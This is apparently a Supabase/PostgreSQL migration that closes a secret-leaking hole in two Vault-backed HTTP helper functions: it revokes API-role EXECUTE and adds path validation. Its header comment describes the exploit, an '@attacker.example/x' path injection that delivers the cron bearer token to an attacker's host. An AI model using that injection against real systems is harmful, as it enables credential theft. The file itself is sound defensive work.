-- Close call_app_api / call_app_api_post to every API role.
--
-- Both are SECURITY DEFINER helpers that read `app_base_url` and `cron_secret`
-- from Vault and send `Authorization: Bearer <cron_secret>` to
-- `app_base_url || path`. They carried the default function ACL — EXECUTE for
-- PUBLIC, anon, authenticated and service_role — so anyone holding the public
-- anon key could `POST /rest/v1/rpc/call_app_api_post` and:
--
--   - invoke every CRON_SECRET-gated route, with any path, any body, any
--     `firmId` — the cron secret is the one credential that skips the session
--     check and the firm binding together;
--   - exfiltrate the secret itself: `path` was concatenated unchecked, so
--     `@attacker.example/x` turned the URL into
--     `https://<app-host>@attacker.example/x`, userinfo and all, and pg_net
--     delivered the bearer header to a host the caller controls.
--
-- Their only legitimate callers are trigger functions, and nothing in app/,
-- lib/ or scripts/ reaches them through `.rpc(`. So EXECUTE goes from every
-- API role, service_role included: nothing needs it, and a service-role
-- caller would have the same path-injection reach.
--
-- A SECURITY DEFINER trigger function runs as its owner (postgres), which
-- keeps EXECUTE as owner, so the triggers keep firing. The exception was
-- webhook_file_uploaded(): it was SECURITY INVOKER, so it ran as whoever
-- updated `files.file_urls` — an authed staff session on the upload and
-- exhibits paths — and after the revoke that update would raise 42501. It is
-- made SECURITY DEFINER with a pinned search_path, the same shape as
-- webhook_deliverable_status_finalized / webhook_deliverable_version_uploaded.
-- A trigger function cannot be called directly (PostgREST does not expose
-- `returns trigger`, and a direct call raises), so this widens nothing.
--
-- The path check is defence in depth behind the revoke: every trigger caller
-- passes a literal '/api/...' with id-shaped parameters, so a path that does
-- not start with '/' or that carries '@', '//', '..', a backslash, whitespace
-- or a control character is a bug or an attack, never a request.
--
-- Idempotent: CREATE OR REPLACE, REVOKE and ALTER FUNCTION all re-run cleanly.

CREATE OR REPLACE FUNCTION public.call_app_api(path text)
 RETURNS bigint
 LANGUAGE plpgsql
 SECURITY DEFINER
 SET search_path = ''
AS $function$
DECLARE
  base_url text;
  secret text;
BEGIN
  IF path IS NULL
     OR left(path, 1) <> '/'
     OR path ~ '[@\\[:space:][:cntrl:]]'
     OR strpos(path, '//') > 0
     OR strpos(path, '..') > 0 THEN
    RAISE EXCEPTION 'call_app_api: refusing path %', quote_nullable(path)
      USING ERRCODE = '22023';
  END IF;

  SELECT decrypted_secret INTO base_url FROM vault.decrypted_secrets WHERE name = 'app_base_url' LIMIT 1;
  SELECT decrypted_secret INTO secret FROM vault.decrypted_secrets WHERE name = 'cron_secret' LIMIT 1;
  RETURN net.http_get(
    url := base_url || path,
    headers := jsonb_build_object('Authorization', 'Bearer ' || secret)
  );
END;
$function$;

CREATE OR REPLACE FUNCTION public.call_app_api_post(path text, body jsonb DEFAULT '{}'::jsonb)
 RETURNS bigint
 LANGUAGE plpgsql
 SECURITY DEFINER
 SET search_path = ''
AS $function$
DECLARE
  base_url text;
  secret text;
BEGIN
  IF path IS NULL
     OR left(path, 1) <> '/'
     OR path ~ '[@\\[:space:][:cntrl:]]'
     OR strpos(path, '//') > 0
     OR strpos(path, '..') > 0 THEN
    RAISE EXCEPTION 'call_app_api_post: refusing path %', quote_nullable(path)
      USING ERRCODE = '22023';
  END IF;

  SELECT decrypted_secret INTO base_url FROM vault.decrypted_secrets WHERE name = 'app_base_url' LIMIT 1;
  SELECT decrypted_secret INTO secret FROM vault.decrypted_secrets WHERE name = 'cron_secret' LIMIT 1;
  RETURN net.http_post(
    url := base_url || path,
    headers := jsonb_build_object('Authorization', 'Bearer ' || secret, 'Content-Type', 'application/json'),
    body := body
  );
END;
$function$;

REVOKE EXECUTE ON FUNCTION public.call_app_api(text) FROM PUBLIC, anon, authenticated, service_role;
REVOKE EXECUTE ON FUNCTION public.call_app_api_post(text, jsonb) FROM PUBLIC, anon, authenticated, service_role;

ALTER FUNCTION public.webhook_file_uploaded() SECURITY DEFINER;
ALTER FUNCTION public.webhook_file_uploaded() SET search_path = public, pg_temp;

-- EXECUTE on a trigger function is checked at CREATE TRIGGER, never when it
-- fires (verified: an authed files.file_urls update with the grant revoked
-- still fires and still queues both requests). Without this the advisors list
-- the newly-DEFINER function under both *_security_definer_function_executable
-- lints, trading one finding for another.
REVOKE EXECUTE ON FUNCTION public.webhook_file_uploaded() FROM PUBLIC, anon, authenticated, service_role;
